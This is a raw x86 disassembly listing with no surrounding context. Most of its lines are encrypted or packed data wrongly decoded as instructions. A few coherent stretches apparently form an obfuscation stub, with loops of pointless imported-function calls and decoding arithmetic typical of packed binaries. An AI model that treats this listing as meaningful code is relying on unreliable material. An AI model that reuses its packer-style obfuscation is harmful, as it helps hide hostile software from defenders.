  4051c3:	jmp    0x40519b
  4051c5:	push   esp
  4051c6:	jg     0x405188
  4051c8:	inc    eax
  4051c9:	mov    esp,0x53a36571
  4051ce:	not    bl
  4051d0:	xchg   ebp,eax
  4051d1:	scas   al,BYTE PTR es:[edi]
  4051d2:	xor    cl,ah
  4051d4:	xchg   dl,cl
  4051d6:	jmp    0x405257
  4051d8:	pop    edx
  4051d9:	pushf  
  4051da:	hlt    
  4051db:	mov    bl,0x40
  4051dd:	jbe    0x405208
  4051df:	inc    ebp
  4051e0:	test   DWORD PTR [edi],ecx
  4051e2:	mov    al,0x58
  4051e4:	or     al,0x26
  4051e6:	fwait
  4051e7:	adc    eax,0xa6ffeba6
  4051ec:	pop    ebx
  4051ed:	adc    al,0x8c
  4051ef:	mov    edi,DWORD PTR [eax+eax*4]
  4051f2:	jns    0x4051e3
  4051f4:	scas   al,BYTE PTR es:[edi]
  4051f5:	and    ebx,esp
  4051f7:	adc    eax,0x299a5b2c
  4051fc:	test   al,0xd2
  4051fe:	daa    
  4051ff:	mov    eax,ds:0xef28b0e4
  405204:	inc    esi
  405205:	mov    ebx,0x2cd6a65
  40520a:	dec    esp
  40520b:	rol    BYTE PTR [esp+ebx*8+0x1a],cl
  40520f:	inc    esi
  405210:	mov    ss,WORD PTR [bp-0x66b8]
  405215:	ret    0x47a
  405218:	adc    al,0x8b
  40521a:	outs   dx,DWORD PTR ds:[esi]
  40521b:	pop    esi
  40521c:	mov    edx,0x88c7eba4
  405221:	jg     0x40526a
  405223:	cmp    dl,BYTE PTR [esi+0x29]
  405226:	mov    al,ds:0xf4afd4c
  40522b:	stc    
  40522c:	rol    DWORD PTR [esi],1
  40522e:	sub    ah,ch
  405230:	mov    al,0xfb
  405232:	jmp    0x4051cd
  405234:	push   edx
  405235:	xchg   esp,eax
  405236:	jg     0x405234
  405238:	iret   
  405239:	jo     0x405273
  40523b:	push   ebp
  40523c:	cdq    
  40523d:	nop
  40523e:	cmp    eax,0x8a38eacb
  405243:	leave  
  405244:	jno    0x4051cf
  405246:	rcl    DWORD PTR fs:[edi+0x1b02f82],1
  40524d:	dec    BYTE PTR [edi+0x689f27b4]
  405253:	ins    BYTE PTR es:[edi],dx
  405254:	ror    DWORD PTR [ebx-0x8],1
  405257:	jae    0x40525a
  405259:	pop    eax
  40525a:	and    al,0x23
  40525c:	xor    edx,DWORD PTR [edx+eiz*1-0xebbdb58]
  405263:	pop    edx
  405264:	adc    ecx,ecx
  405266:	fisub  DWORD PTR [edx+ebx*1+0x67]
  40526a:	popf   
  40526b:	arpl   WORD PTR [edx-0x21],di
  40526e:	sub    eax,0xeebe981d
  405273:	test   al,0xe3
  405275:	pop    es
  405276:	xchg   ch,al
  405278:	dec    edi
  405279:	into   
  40527a:	sub    eax,0xee2a6e99
  40527f:	rol    dl,cl
  405281:	shl    BYTE PTR [ebx-0x2e],0x54
  405285:	cmp    BYTE PTR [ebp-0x32],ch
  405288:	pop    esi
  405289:	(bad)  
  40528a:	mov    dh,0x3e
  40528c:	add    edi,esi
  40528e:	sub    BYTE PTR [ebp+0x17],bh
  405291:	popf   
  405292:	adc    DWORD PTR [ecx],0x52
  405295:	dec    edi
  405296:	pop    ds
  405297:	loopne 0x405303
  405299:	setb   BYTE PTR [ecx]
  40529c:	clc    
  40529d:	cdq    
  40529e:	out    0x5a,al
  4052a0:	js     0x4052e8
  4052a2:	out    dx,al
  4052a3:	in     eax,dx
  4052a4:	jge    0x405323
  4052a6:	push   0x20
  4052a8:	xor    BYTE PTR [esi],bh
  4052aa:	(bad)  
  4052ab:	mov    dh,0xd9
  4052ad:	sbb    edi,DWORD PTR ds:0x494ad556
  4052b3:	mov    edx,0x80a4b75e
  4052b8:	es push 0xffffffed
  4052bb:	dec    ebx
  4052bc:	das    
  4052bd:	loopne 0x405272
  4052bf:	pop    esi
  4052c0:	mov    edx,0x42993adb
  4052c5:	ffree  st(7)
  4052c7:	lahf   
  4052c8:	sub    eax,0xea42d235
  4052cd:	dec    edi
  4052ce:	(bad)  
  4052d0:	hlt    
  4052d1:	pop    es
  4052d2:	xchg   DWORD PTR [ebp+0xd],ebx
  4052d5:	mov    dh,0xbb
  4052d7:	push   ds
  4052d8:	(bad)  
  4052d9:	int3   
  4052da:	mov    ebx,0x339724e3
  4052df:	cmp    eax,0xf077d12b
  4052e4:	inc    ecx
  4052e5:	dec    edx
  4052e6:	jne    0x405344
  4052e8:	cmc    
  4052e9:	and    eax,0xf24b8303
  4052ee:	sbb    eax,0xcd5b3eb7
  4052f3:	fs and eax,0xa5e2bdbc
  4052f9:	retf   0xc186
  4052fc:	jl     0x405355
  4052fe:	sbb    edx,DWORD PTR [ebx]
  405300:	icebp  
  405301:	xor    BYTE PTR [ecx],ah
  405303:	mov    bh,0x4f
  405305:	(bad)  
  405307:	pop    ds
  405308:	leave  
  405309:	sub    DWORD PTR [ebp+0x76],edi
  40530c:	cmp    edx,DWORD PTR [eax]
  40530e:	loop   0x4052a5
  405310:	add    ebx,edi
  405312:	mov    esi,0x38a7a4c0
  405317:	pusha  
  405318:	push   ds
  405319:	cmp    DWORD PTR [esi+0x63],edx
  40531c:	shl    BYTE PTR [edx+ebx*4],0xd1
  405320:	je     0x4052c2
  405322:	pop    ds
  405323:	cmp    ecx,DWORD PTR [edx]
  405325:	out    0xa2,eax
  405327:	sahf   
  405328:	jmp    0xb55b:0x88da5b0a
  40532f:	dec    edi
  405330:	or     bl,BYTE PTR [ebp+0x3b]
  405333:	js     0x40539c
  405335:	mov    DWORD PTR [ebx-0x31bf842b],edi
  40533b:	or     al,BYTE PTR [edx-0x2b]
  40533e:	inc    ecx
  40533f:	jg     0x40537f
  405341:	dec    ecx
  405342:	in     eax,dx
  405343:	mov    ds:0xeee344e6,al
  405348:	mov    ebx,0x1b940273
  40534d:	icebp  
  40534e:	mov    eax,ds:0x2b6d1c31
  405353:	mov    ebx,0xc2e22690
  405358:	enter  0xd6bf,0x33
  40535c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40535d:	out    dx,eax
  40535e:	jnp    0x405302
  405360:	xor    DWORD PTR [ebx+0x1],eax
  405363:	add    al,0x46
  405365:	retf   0x175c
  405368:	xor    DWORD PTR [edx-0x4e],edx
  40536b:	mov    bh,BYTE PTR [ebp+0x50]
  40536e:	(bad)  
  40536f:	rcl    BYTE PTR [edi],1
  405371:	loop   0x40539f
  405373:	in     eax,dx
  405374:	sbb    bl,BYTE PTR [edx+0x30184b2e]
  40537a:	or     esp,ebx
  40537c:	sti    
  40537d:	js     0x405388
  40537f:	cmp    bh,BYTE PTR [ecx]
  405381:	xchg   ecx,eax
  405382:	mov    ch,BYTE PTR [ebx]
  405384:	bound  eax,QWORD PTR [esi+0x4c62e04e]
  40538a:	cli    
  40538b:	sub    esp,DWORD PTR [ebx-0x697b7a49]
  405391:	add    DWORD PTR [esi],ebp
  405393:	imul   ebx,DWORD PTR [ebx-0x77ff45e0],0x473176b1
  40539d:	mov    esi,0xdb12eee5
  4053a2:	sbb    eax,0xdf5de411
  4053a7:	pop    ds
  4053a8:	inc    eax
  4053a9:	(bad)
  4053ac:	js     0x405380
  4053ae:	dec    esi
  4053af:	shr    DWORD PTR [ebx-0x67],0xac
  4053b3:	jg     0x40535a
  4053b5:	call   0x120a:0x2a9955d4
  4053bc:	cli    
  4053bd:	daa    
  4053be:	pop    esp
  4053bf:	add    al,0x44
  4053c1:	xor    BYTE PTR [esi-0x4a],dh
  4053c4:	jbe    0x4053dd
  4053c6:	js     0x405400
  4053c8:	(bad)  
  4053c9:	fidiv  WORD PTR [esi+0x3e]
  4053cc:	hlt    
  4053cd:	ins    BYTE PTR es:[edi],dx
  4053ce:	out    dx,eax
  4053cf:	xor    edx,ebp
  4053d1:	push   ds
  4053d2:	popa   
  4053d3:	push   0x34
  4053d5:	retf   
  4053d6:	inc    ebp
  4053d7:	inc    ebp
  4053d8:	repnz out dx,eax
  4053da:	add    DWORD PTR [ebx],0xdedf8125
  4053e0:	mov    ebp,0xb881e6c4
  4053e5:	rcr    BYTE PTR [edx],0x2e
  4053e8:	arpl   si,ax
  4053ea:	ret    
  4053eb:	and    eax,0xb6511669
  4053f0:	cmc    
  4053f1:	adc    BYTE PTR [edx+0x29467354],0xe3
  4053f8:	dec    edi
  4053f9:	repnz mov al,ds:0x685e6c1c
  4053ff:	mov    ah,0x8c
  405401:	test   eax,0x255d58d7
  405406:	pop    ecx
  405407:	in     eax,dx
  405408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405409:	mov    ebx,0x63369e6
  40540e:	or     eax,0xf34a8746
  405413:	pop    esp
  405414:	push   ecx
  405415:	sub    BYTE PTR [edi],cl
  405417:	xchg   ebx,eax
  405418:	mov    bh,BYTE PTR [esi]
  40541a:	sub    edi,edx
  40541c:	clc    
  40541d:	xor    BYTE PTR [eax-0x54bdefce],dh
  405423:	ds xor eax,0x28aca64c
  405429:	mov    ecx,0x137ac4dc
  40542e:	xor    edi,DWORD PTR ds:0xd3ab88e0
  405434:	fistp  DWORD PTR fs:[edi-0x28]
  405438:	rcr    BYTE PTR [edx-0x19],cl
  40543b:	fnsave [edx-0x25]
  40543e:	jno    0x405466
  405440:	add    esp,DWORD PTR [edi]
  405442:	popa   
  405443:	xor    al,0x11
  405445:	xor    al,0x99
  405447:	in     al,0xb9
  405449:	aas    
  40544a:	sbb    eax,0x1049685c
  40544f:	mov    bl,0xa7
  405451:	jne    0x405480
  405453:	mov    esi,0x660ad265
  405458:	push   eax
  405459:	pushf  
  40545a:	push   cs
  40545b:	ins    DWORD PTR es:[edi],dx
  40545c:	call   0x9b7cd262
  405461:	cli    
  405462:	dec    ebp
  405463:	ss push edi
  405465:	adc    bl,BYTE PTR [eax+eax*4-0x48ac4670]
  40546c:	pop    edx
  40546d:	and    bl,BYTE PTR ds:0xf17b4efe
  405473:	dec    edi
  405474:	jmp    0x40542c
  405476:	mov    edx,0x96f01b4a
  40547b:	jae    0x4054c6
  40547d:	ficom  DWORD PTR [ebx+0x1]
  405480:	mov    BYTE PTR [ecx-0x23a7cf89],0xa2
  405487:	xor    edx,edx
  405489:	xchg   esi,eax
  40548b:	iret   
  40548c:	ret    0xf44c
  40548f:	adc    BYTE PTR gs:0x88690d9a,al
  405496:	mov    WORD PTR [ecx-0xf],gs
  405499:	cli    
  40549a:	adc    al,0x7c
  40549c:	or     ebx,DWORD PTR [ebx+0x311c9734]
  4054a2:	in     al,0x4e
  4054a4:	fiadd  DWORD PTR [ebx-0x58]
  4054a7:	xor    al,BYTE PTR [eax+eax*4-0x3574417b]
  4054ae:	das    
  4054af:	rcl    DWORD PTR [edx+ebp*8-0x1f],1
  4054b3:	into   
  4054b4:	ins    DWORD PTR es:[edi],dx
  4054b5:	jb     0x405457
  4054b7:	popf   
  4054b8:	nop
  4054b9:	fimul  WORD PTR [ecx+0x54f0412b]
  4054bf:	sbb    BYTE PTR [ecx-0x4f3445b6],0xa2
  4054c6:	(bad)  
  4054c8:	xchg   esp,eax
  4054c9:	mov    ds:0x34b5f7f,eax
  4054ce:	shr    ecx,1
  4054d0:	push   ss
  4054d1:	sldt   WORD PTR [eax]
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4337e7
  4054e3:	or     DWORD PTR ds:0x433803,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4337f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4337f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4337f3,ebx
  405504:	cmp    DWORD PTR ds:0x4337f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4337f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4337f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4337f3,ebx
  405545:	cmp    DWORD PTR ds:0x4337f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4337f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4337b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4337b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4337b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4337b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433946
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4337b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0xc1e24fcc
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x40562d
  40563a:	leave  
  40563b:	pushf  
  40563c:	and    eax,0xc0e5f779
  405641:	and    ch,BYTE PTR ds:0x8ba971a0
  405647:	das    
  405648:	mov    es,WORD PTR [eax-0x9]
  40564b:	xchg   edx,eax
  40564c:	ja     0x40562a
  40564e:	gs sub al,0x4e
  405651:	call   DWORD PTR [edx-0x1f]
  405654:	mov    ah,bl
  405656:	loopne 0x40561f
  405658:	pop    ecx
  405659:	out    0x3c,eax
  40565b:	sbb    ebx,DWORD PTR [ebx+0x4a]
  40565e:	es inc edx
  405660:	push   0xffffffab
  405662:	cdq    
  405663:	sub    esi,eax
  405665:	xlat   BYTE PTR ds:[ebx]
  405666:	repz push edi
  405668:	rol    ch,0x53
  40566b:	sti    
  40566c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40566d:	retf   
  40566e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40566f:	xchg   edi,eax
  405670:	pop    esp
  405671:	adc    eax,DWORD PTR [edi+0x37258a1f]
  405677:	fld    TBYTE PTR [edx+esi*4-0x43]
  40567b:	mov    cl,0x3c
  40567d:	popa   
  40567e:	cmp    DWORD PTR [edx],ebx
  405680:	sbb    esi,DWORD PTR [edi+0x53f49fcc]
  405686:	or     ah,BYTE PTR [ecx]
  405688:	inc    ecx
  405689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40568a:	daa    
  40568b:	cs aaa 
  40568d:	int3   
  40568e:	mov    dh,0xb3
  405690:	mov    al,bh
  405692:	scas   eax,DWORD PTR es:[edi]
  405693:	je     0x4056ce
  405695:	pushf  
  405696:	ror    al,cl
  405698:	sub    DWORD PTR [edi],edx
  40569a:	sub    BYTE PTR [edi-0x32c1042e],al
  4056a0:	call   0x2f76:0x9364d1b3
  4056a7:	dec    edx
  4056a8:	std    
  4056a9:	push   ecx
  4056aa:	jne    0x405658
  4056ac:	sub    al,0xe0
  4056ae:	out    0x82,eax
  4056b0:	test   DWORD PTR ds:0xf3b831b9,0x58548550
  4056ba:	add    al,0x4
  4056bc:	pop    edi
  4056bd:	sbb    DWORD PTR [ebx+edi*2],esp
  4056c0:	sbb    eax,0x5042cc39
  4056c5:	popf   
  4056c6:	out    0x0,eax
  4056c8:	push   es
  4056c9:	out    0x17,al
  4056cb:	aam    0x4f
  4056cd:	(bad)  [esp+ecx*4-0x3be7d396]
  4056d4:	arpl   WORD PTR [edx+0x75],sp
  4056d7:	(bad)  
  4056d8:	ds xchg ebx,edx
  4056db:	lds    eax,FWORD PTR [esi-0x80]
  4056de:	sub    ah,ch
  4056e0:	clc    
  4056e1:	pop    edi
  4056e2:	xchg   ecx,eax
  4056e3:	dec    edx
  4056e4:	push   0x30ce4607
  4056e9:	and    DWORD PTR ds:0xf2087386,eax
  4056ef:	push   0x9370a880
  4056f4:	cdq    
  4056f5:	cli    
  4056f6:	adc    al,0xc
  4056f8:	push   esp
  4056f9:	sar    BYTE PTR [eax-0x62],1
  4056fc:	ret    0x31cf
  4056ff:	jle    0x4056df
  405701:	mov    DWORD PTR [ecx-0x3124c706],ebp
  405707:	in     al,dx
  405708:	push   0x4cb58de2
  40570d:	xchg   edx,eax
  40570e:	lds    edi,FWORD PTR ds:[esi+0x5]
  405712:	aad    0xa7
  405714:	call   0x4c0b:0xc2e451d2
  40571b:	xor    DWORD PTR [ecx],ebp
  40571d:	mov    eax,0xeaf7ee10
  405722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405723:	xchg   edi,eax
  405724:	xchg   edx,eax
  405725:	iret   
  405726:	imul   eax,edi,0xd1579086
  40572c:	push   cs
  40572d:	cld    
  40572e:	xchg   DWORD PTR [ebp-0x4d9b87a9],esp
  405734:	adc    al,0xe2
  405736:	sahf   
  405737:	xchg   edi,eax
  405738:	popa   
  405739:	xchg   esi,eax
  40573a:	push   ecx
  40573b:	cld    
  40573c:	xchg   edx,eax
  40573d:	or     BYTE PTR [ebx+0x725e58c0],bh
  405743:	repnz bound edi,QWORD PTR [ebx-0x57]
  405747:	dec    esp
  405748:	fstp   QWORD PTR [edi+0x18]
  40574b:	jns    0x405704
  40574d:	cmp    ebp,ebp
  40574f:	shl    DWORD PTR [eax+0x74],1
  405752:	repnz push ebp
  405754:	jg     0x4057d5
  405756:	add    ebp,DWORD PTR [esi]
  405758:	lock loopne 0x40577f
  40575b:	psrlw  mm4,0x9f
  40575f:	iret   
  405760:	mov    bl,0xf2
  405762:	out    0xaf,eax
  405764:	cmp    eax,0x61d63c22
  405769:	pop    edi
  40576a:	(bad)  
  40576b:	outs   dx,BYTE PTR ds:[si]
  40576d:	out    dx,al
  40576e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40576f:	and    bh,BYTE PTR [ebx-0x4dff9c0a]
  405775:	loope  0x405733
  405777:	inc    ebx
  405778:	in     al,dx
  405779:	sbb    BYTE PTR [edx+ebx*1-0x6b1c7632],dh
  405780:	sahf   
  405781:	xor    ecx,edx
  405783:	fistp  WORD PTR [ebx+ebp*2]
  405786:	and    al,BYTE PTR [eax]
  405788:	push   esp
  405789:	xor    DWORD PTR [ebp-0x119dd407],esi
  40578f:	shl    dl,0xf3
  405792:	and    BYTE PTR [eax],dh
  405794:	imul   DWORD PTR [edi]
  405796:	imul   ebp,DWORD PTR [edi+0x1e],0xffffff83
  40579a:	xchg   ecx,eax
  40579b:	push   ss
  40579c:	aaa    
  40579d:	pop    edx
  40579e:	jmp    0x5d0b:0xd709f7d
  4057a5:	xor    al,dh
  4057a7:	inc    edx
  4057a8:	(bad)  
  4057aa:	stc    
  4057ab:	hlt    
  4057ac:	sub    DWORD PTR [ebx+0x6b],ebp
  4057af:	pusha  
  4057b0:	or     eax,0x555f47e4
  4057b5:	std    
  4057b6:	push   ecx
  4057b7:	sub    ecx,DWORD PTR ds:0xe10f09b6
  4057bd:	(bad)  
  4057be:	fadd   DWORD PTR [ebx]
  4057c0:	in     al,0x5c
  4057c2:	lock dec ebx
  4057c4:	sub    eax,0x55a0f97f
  4057c9:	jnp    0x405826
  4057cb:	cli    
  4057cc:	sbb    dl,BYTE PTR [esi+0x7327f495]
  4057d2:	sub    al,0x6
  4057d4:	xor    DWORD PTR [edx-0x72f7dec9],ebp
  4057da:	cld    
  4057db:	inc    eax
  4057dc:	sbb    esi,DWORD PTR [esi-0x6fef4c1a]
  4057e2:	and    DWORD PTR [esi],0xffffffbd
  4057e5:	jg     0x40584c
  4057e7:	adc    ebx,esi
  4057e9:	push   ecx
  4057ea:	sub    BYTE PTR [esi],bh
  4057ec:	xchg   DWORD PTR fs:[ecx-0x5e],ebp
  4057f0:	or     edi,esi
  4057f2:	mov    ebp,0x9cdb6390
  4057f7:	das    
  4057f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057f9:	dec    esp
  4057fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057fc:	sbb    al,0x52
  4057fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057ff:	mov    cl,0x95
  405801:	jb     0x40587a
  405803:	mov    ds:0x9197b679,eax
  405808:	cmp    bh,BYTE PTR [edi]
  40580a:	fdivr  DWORD PTR [edx-0x50]
  40580d:	push   0x67
  40580f:	jb     0x405855
  405811:	dec    ebp
  405812:	repnz fcom st(7)
  405815:	les    ecx,FWORD PTR [edi+0x61]
  405818:	nop
  405819:	stc    
  40581a:	mov    al,ds:0xfe8d6f5
  40581f:	push   ecx
  405820:	test   eax,0xef7e36f1
  405825:	mov    edx,0x74e05834
  40582a:	xchg   ebx,ecx
  40582c:	mov    esp,DWORD PTR [edi-0xb]
  40582f:	jmp    0x405814
  405831:	out    0x6a,eax
  405833:	jp     0x40584e
  405835:	ret    
  405836:	xchg   ebx,eax
  405837:	in     eax,0x1a
  405839:	or     ecx,DWORD PTR [ebx]
  40583b:	(bad)  
  40583c:	jge    0x40587d
  40583e:	add    esp,ebp
  405840:	or     al,0x4c
  405842:	popf   
  405843:	(bad)  
  405844:	repz jecxz 0x405847
  405847:	fldcw  WORD PTR [edi-0x729c14a1]
  40584d:	in     al,dx
  40584e:	or     eax,ebp
  405850:	ret    
  405851:	out    0x91,al
  405853:	and    bl,BYTE PTR [esp+ecx*8+0x2f9ed067]
  40585a:	and    bh,bl
  40585c:	sub    ch,BYTE PTR [esi-0x1e69e92d]
  405862:	rol    ch,0x21
  405865:	pop    edx
  405866:	das    
  405867:	in     eax,0xb8
  405869:	test   DWORD PTR [ecx+0x1b],ebp
  40586c:	xchg   ecx,eax
  40586d:	repnz (bad) 
  40586f:	cmp    cl,bl
  405871:	aam    0x70
  405873:	sub    esp,0x32004d81
  405879:	sub    al,0x1a
  40587b:	mov    DWORD PTR [edi],eax
  40587d:	frstor ds:0x5b1d6c79
  405883:	push   eax
  405884:	sbb    al,0x54
  405886:	xor    esi,edx
  405888:	jmp    0xb128b6a7
  40588d:	retf   0x453f
  405890:	mul    BYTE PTR ds:0xf76808c5
  405896:	aaa    
  405897:	adc    ebp,DWORD PTR [ebp+0x46aafcfb]
  40589d:	rcr    DWORD PTR [eax-0x53cea7c0],cl
  4058a3:	mov    ch,0x73
  4058a5:	call   0x120b7af7
  4058aa:	sahf   
  4058ab:	cmp    al,0xea
  4058ad:	(bad)
  4058b0:	loop   0x405882
  4058b2:	push   es
  4058b3:	and    al,0xcd
  4058b5:	jnp    0x405919
  4058b7:	fidiv  WORD PTR [esi+0x7c]
  4058ba:	or     BYTE PTR [ecx+0x3239c27d],cl
  4058c0:	test   al,0xf4
  4058c2:	mov    esi,0xb209c310
  4058c7:	pop    ebx
  4058c8:	mov    bh,0x39
  4058ca:	cwde   
  4058cb:	fldpi  
  4058cd:	push   ebp
  4058ce:	aaa    
  4058cf:	pop    ebx
  4058d0:	mov    ds:0xdda5ca6f,eax
  4058d5:	fs bnd jne 0x4058cb
  4058d9:	jecxz  0x405951
  4058db:	arpl   WORD PTR [esi+0x1],dx
  4058de:	pop    ss
  4058df:	xor    eax,0xa2a8e863
  4058e4:	xor    eax,DWORD PTR [ebp-0x32]
  4058e7:	js     0x4058c1
  4058e9:	xchg   ebx,edi
  4058eb:	sub    BYTE PTR [edi],dl
  4058ed:	sbb    cl,bl
  4058ef:	xchg   esp,eax
  4058f0:	into   
  4058f1:	mov    esi,0x3aa820f2
  4058f6:	pop    es
  4058f7:	and    BYTE PTR [ebx-0x6d],al
  4058fa:	aam    0xb4
  4058fc:	cdq    
  4058fd:	xor    bh,ah
  4058ff:	jmp    0x1ae7:0x8a508566
  405906:	popf   
  405907:	ret    0xd7a3
  40590a:	lock push 0x95af277c
  405910:	into   
  405911:	push   es
  405912:	pop    edi
  405913:	push   ds
  405914:	jecxz  0x405952
  405916:	sti    
  405917:	inc    edx
  405918:	mov    bh,BYTE PTR [ebp+0x18]
  40591b:	add    al,0xb7
  40591d:	inc    esp
  40591e:	mov    esi,0x9560bc23
  405923:	popf   
  405924:	add    al,cl
  405926:	push   esp
  405927:	mov    ecx,0x68af23ac
  40592c:	mov    edx,0x713b9388
  405931:	push   esp
  405932:	mov    DWORD PTR [ebx+0x13],ebx
  405935:	xor    DWORD PTR [esi],edx
  405937:	mov    DWORD PTR [edi+0x7],ebx
  40593a:	adc    al,0x8b
  40593c:	sub    al,0xb1
  40593e:	loope  0x4059ad
  405940:	lock (bad) 
  405942:	push   edx
  405943:	or     al,dl
  405945:	sbb    DWORD PTR [edi],0x75
  405948:	addr16 jg 0x4059ad
  40594b:	jmp    0xfb4a5f33
  405950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405951:	retf   0x9b06
  405954:	gs aad 0xac
  405957:	adc    ah,BYTE PTR [edi+edx*2+0x1a2c1442]
  40595e:	adc    al,0xd8
  405960:	adc    eax,0xd357a16c
  405965:	arpl   WORD PTR [eax+esi*1+0x7f],bp
  405969:	push   0x724569a7
  40596e:	push   eax
  40596f:	mov    edx,0x4c5b680c
  405974:	pop    ecx
  405975:	mov    edx,DWORD PTR gs:[ebp-0x30]
  405979:	jmp    0x4063dc
  40597e:	mov    edx,DWORD PTR [ebp-0x38]
  405981:	mov    edi,DWORD PTR [ebp-0x4]
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	arpl   WORD PTR [esi],dx
  4059b2:	add    al,0x34
  4059b4:	push   0x32
  4059b6:	jle    0x405a36
  4059b8:	xor    edi,DWORD PTR [ebp+0x7e]
  4059bb:	jle    0x4059ca
  4059bd:	and    ah,ah
  4059bf:	xor    al,0x8a
  4059c1:	push   ebx
  4059c2:	adc    BYTE PTR [eax+0x7],bl
  4059c5:	leave  
  4059c6:	hlt    
  4059c7:	pop    esp
  4059c8:	adc    cl,cl
  4059ca:	pop    eax
  4059cb:	sub    BYTE PTR [edx],0x4b
  4059ce:	and    DWORD PTR [ebp+0x6b],ecx
  4059d1:	mov    al,ds:0x3bac112e
  4059d6:	shl    edx,cl
  4059d8:	div    edx
  4059da:	in     al,0x8f
  4059dc:	ror    BYTE PTR [esi],1
  4059de:	rcr    BYTE PTR [ecx],1
  4059e0:	(bad)  
  4059e2:	mov    ecx,0xaeb735a1
  4059e7:	jecxz  0x4059da
  4059e9:	bound  eax,QWORD PTR [esi]
  4059eb:	pop    ss
  4059ec:	fistp  WORD PTR ds:0x3be03934
  4059f2:	inc    edi
  4059f3:	xor    BYTE PTR [edi],ah
  4059f5:	(bad)  
  4059f6:	adc    dh,al
  4059f8:	inc    eax
  4059f9:	cdq    
  4059fa:	inc    eax
  4059fb:	push   0x61
  4059fd:	repz dec ebx
  4059ff:	(bad)  
  405a01:	push   edx
  405a02:	add    BYTE PTR [eax+0x77],bl
  405a05:	dec    ebx
  405a06:	mov    cl,0xc2
  405a08:	push   ebx
  405a09:	or     al,0xa3
  405a0b:	jp     0x4059a8
  405a0d:	jne    0x4059e4
  405a0f:	fwait
  405a10:	ja     0x405a13
  405a12:	out    0x4e,eax
  405a14:	xchg   ebp,eax
  405a15:	xchg   esi,eax
  405a16:	xchg   DWORD PTR [ecx-0x3b6e14ea],edx
  405a1c:	mov    bl,0x40
  405a1e:	cmp    cl,bl
  405a20:	sbb    eax,0xa197cf9a
